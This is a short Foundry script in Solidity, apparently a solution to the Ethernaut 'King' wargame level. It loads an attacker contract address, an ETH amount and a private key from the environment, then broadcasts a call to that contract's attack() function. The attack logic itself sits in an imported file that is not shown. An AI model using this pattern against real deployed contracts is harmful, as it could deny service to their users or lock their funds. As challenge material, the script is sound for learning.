// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {KingAttacker} from "../src/KingAttacker.sol";

contract KingAttack is Script{
  function run() public{
    address kingAttackerAddress = vm.envAddress("ATTACKER_CONTRACT");
    uint256 attackValue = vm.envUint("ATTACK_VALUE");

    uint256 attackerPK = vm.envUint("PRIVATE_KEY");

    KingAttacker kingAttacker = KingAttacker(payable(kingAttackerAddress));

    vm.broadcast(attackerPK);
    kingAttacker.attack{value: attackValue}();
  }
}